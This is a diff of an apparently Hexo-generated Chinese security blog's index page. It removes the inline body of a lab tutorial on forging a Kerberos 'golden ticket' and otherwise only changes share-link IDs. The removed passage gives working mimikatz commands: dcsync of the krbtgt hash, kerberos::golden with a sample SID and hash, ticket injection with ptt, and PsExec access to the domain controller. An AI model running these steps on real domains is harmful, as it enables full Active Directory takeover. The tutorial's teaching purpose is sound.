@@ -123,17 +123,15 @@
 <li>域的KRBTGT账户NTLM密码哈希</li>
 <li>伪造用户名</li>
 </ol>
-<h3 id="实验过程："><a href="#实验过程：" class="headerlink" title="实验过程："></a>实验过程：</h3><h4 id="1-获取域控制器的-krbtgt-哈希值"><a href="#1-获取域控制器的-krbtgt-哈希值" class="headerlink" title="1. 获取域控制器的 krbtgt 哈希值"></a>1. 获取域控制器的 krbtgt 哈希值</h4><p>通过 mimikatz 输入命令获取 ktbtgt 的哈希值：lsadump::dcsync /domain:test.com /user:krbtgt<br>也可以通过wce、gethashes等方式获取。<br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-1.png" alt></p>
-<h4 id="2-伪造票据（低权限域用户在客户端上伪造）"><a href="#2-伪造票据（低权限域用户在客户端上伪造）" class="headerlink" title="2. 伪造票据（低权限域用户在客户端上伪造）"></a>2. 伪造票据（低权限域用户在客户端上伪造）</h4><p>得到 KRBTGT HASH 之后使用 mimikatz 中的 kerberos::golden 功能生成金票 golden.kiribi，即为伪造成功的TGT。<br>参数说明：<br>/admin:伪造的用户名<br>/domain:域名称<br>/sid:SID 值，域的SID<br>/krbtgt:krbtgt 的 NTLM-HASH 值<br>/ticket:生成的票据名称<br>生成金票命令：kerberos::golden /admin:administrator /domain:test.com /sid:S-1-5-21-593020204-2933201490-533286667 /krbtgt:8894a0f0182bff68e84bd7ba767ac8ed /ticket:golden.kiribi<br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-2-1.png" alt><br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-2-2.png" alt></p>
-<h4 id="3-获取权限"><a href="#3-获取权限" class="headerlink" title="3. 获取权限"></a>3. 获取权限</h4><p>清空本地票据缓存，导入伪造的票据<br>查看本地保存的票据，观察Client name：kerberos::list<br>清理本地票据缓存：kerberos::purge<br>导入伪造的黄金票据：kerberos::ptt golden.kiribi<br>查看本地保存的票据，观察Client name：kerberos::list<br>票据20分钟内有效，过期之后可以再次导入<br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-3-1.png" alt><br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-3-2.png" alt><br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-3-3.png" alt><br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-3-4.png" alt></p>
-<h4 id="4-利用伪造的黄金票据"><a href="#4-利用伪造的黄金票据" class="headerlink" title="4. 利用伪造的黄金票据"></a>4. 利用伪造的黄金票据</h4><p>直接利用psexec.exe远程登录和执行命令<br>Whoami显示当前用户为 yuming域的administrator用户<br>PsExec.exe \域控计算机名 cmd.exe<br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-4.png" alt></p>
-
+      
+      <a class="article-more-link" href="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/">More</a>
+      
       
       <!-- 打赏 -->
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/" data-id="ck6k9n864000hdkwra4i3dkl1"
+      <a data-url="http://yoursite.com/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/" data-id="ck6k9wj6q000hpgwr3h54908q"
         class="article-share-link">Share</a>
       
     </footer>
@@ -201,7 +199,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/%E8%AF%BE%E6%97%B601-Web%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E9%98%B2%E8%8C%83-SQL%E6%B3%A8%E5%85%A5-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" data-id="ck6k9n85n000cdkwrbtn54def"
+      <a data-url="http://yoursite.com/2020/%E8%AF%BE%E6%97%B601-Web%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E9%98%B2%E8%8C%83-SQL%E6%B3%A8%E5%85%A5-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" data-id="ck6k9wj6f000cpgwr4q7q14op"
         class="article-share-link">Share</a>
       
     </footer>
@@ -269,7 +267,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/%E8%AF%BE%E6%97%B613-DMZ%E5%A4%A7%E5%9E%8B%E9%9D%B6%E5%9C%BA%E5%AE%9E%E9%AA%8C-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" data-id="ck6k9n85w000fdkwrbjrsh4df"
+      <a data-url="http://yoursite.com/2020/%E8%AF%BE%E6%97%B613-DMZ%E5%A4%A7%E5%9E%8B%E9%9D%B6%E5%9C%BA%E5%AE%9E%E9%AA%8C-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" data-id="ck6k9wj6m000fpgwrbsd9cdox"
         class="article-share-link">Share</a>
       
     </footer>
@@ -337,7 +335,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/%E8%AF%BE%E6%97%B609-PR%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" data-id="ck6k9n85r000edkwrhxd07lc9"
+      <a data-url="http://yoursite.com/2020/%E8%AF%BE%E6%97%B609-PR%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" data-id="ck6k9wj6j000epgwrbe726x29"
         class="article-share-link">Share</a>
       
     </footer>
@@ -410,7 +408,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/%E7%BB%95%E8%BF%87%E7%81%AB%E7%BB%92%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" data-id="ck6k9n85k000bdkwrddabax09"
+      <a data-url="http://yoursite.com/2020/%E7%BB%95%E8%BF%87%E7%81%AB%E7%BB%92%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" data-id="ck6k9wj6c000bpgwrh61w37k3"
         class="article-share-link">Share</a>
       
     </footer>
@@ -478,7 +476,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/Apache%20Struts2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(S2-016)%E5%A4%8D%E7%8E%B0-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" data-id="ck6k9n8360000dkwrbsnc3v92"
+      <a data-url="http://yoursite.com/2020/Apache%20Struts2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(S2-016)%E5%A4%8D%E7%8E%B0-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" data-id="ck6k9wj350000pgwrfa6c8yoi"
         class="article-share-link">Share</a>
       
     </footer>
@@ -547,7 +545,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95(MySQL%E6%95%B0%E6%8D%AE%E5%BA%93)-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" data-id="ck6k9n83y0004dkwrcxkne2hb"
+      <a data-url="http://yoursite.com/2020/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95(MySQL%E6%95%B0%E6%8D%AE%E5%BA%93)-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" data-id="ck6k9wj430004pgwrat1nh0is"
         class="article-share-link">Share</a>
       
     </footer>
@@ -616,7 +614,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95(MongoDB%E6%95%B0%E6%8D%AE%E5%BA%93)-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" data-id="ck6k9n83p0002dkwrb2hk5sml"
+      <a data-url="http://yoursite.com/2020/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95(MongoDB%E6%95%B0%E6%8D%AE%E5%BA%93)-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" data-id="ck6k9wj3r0002pgwrdyc32v9j"
         class="article-share-link">Share</a>
       
     </footer>
@@ -687,7 +685,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F-%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/" data-id="ck6k9n8490006dkwr5oxd3y6v"
+      <a data-url="http://yoursite.com/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F-%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/" data-id="ck6k9wj4x0006pgwrhfe58rz9"
         class="article-share-link">Share</a>
       
     </footer>
@@ -760,7 +758,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/Sqli-labs%E6%B3%A8%E5%85%A5%E5%B0%8F%E6%B8%B8%E6%88%8F-%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/" data-id="ck6k9n8430005dkwrg5sz7l60"
+      <a data-url="http://yoursite.com/2019/Sqli-labs%E6%B3%A8%E5%85%A5%E5%B0%8F%E6%B8%B8%E6%88%8F-%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/" data-id="ck6k9wj4a0005pgwraxtsfz9g"
         class="article-share-link">Share</a>
       
     </footer>
